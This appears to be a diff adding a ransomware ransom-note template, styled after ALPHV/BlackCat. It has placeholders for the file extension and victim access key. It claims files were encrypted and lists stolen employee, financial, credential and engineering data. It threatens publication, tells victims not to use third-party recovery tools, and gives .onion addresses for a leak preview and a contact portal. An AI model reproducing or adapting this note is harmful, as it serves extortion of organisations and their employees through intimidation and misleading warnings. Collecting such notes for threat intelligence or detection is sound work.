@@ -1,0 +1,31 @@
+>> Introduction
+
+Important files on your system was ENCRYPTED and now they have have "${EXTENSION}" extension.
+In order to recover your files you need to follow instructions below.
+
+>> Sensitive Data
+
+Sensitive data on your system was DOWNLOADED and it will be PUBLISHED if you refuse to cooperate.
+
+Data includes:
+- Employees personal data, CVs, DL, SSN.
+- Complete network map including credentials for local and remote services.
+- Financial information including clients data, bills, budgets, annual reports, bank statements.
+- Complete datagrams/schemas/drawings for manufacturing in solidworks format
+- And more...
+
+Private preview is published here: http://alphvmmm27o3abo3r2mlmjrpdmzle3rykajqc5xsj7j7ejksbpsa36ad.onion/[snip]
+
+
+>> CAUTION
+
+DO NOT MODIFY FILES YOURSELF.
+DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.
+YOU MAY DAMAGE YOUR FILES, IT WILL RESULT IN PERMANENT DATA LOSS.
+YOUR DATA IS STRONGLY ENCRYPTED, YOU CAN NOT DECRYPT IT WITHOUT CIPHER KEY.
+
+>> Recovery procedure
+
+Follow these simple steps to get in touch and recover your data:
+1) Download and install Tor Browser from: https://torproject.org/
+2) Navigate to: http://sty5r4hhb5oihbq2mwevrofdiqbgesi66rvxr5sr573xgvtuvr4cs5yd.onion/?access-key=${ACCESS_KEY}
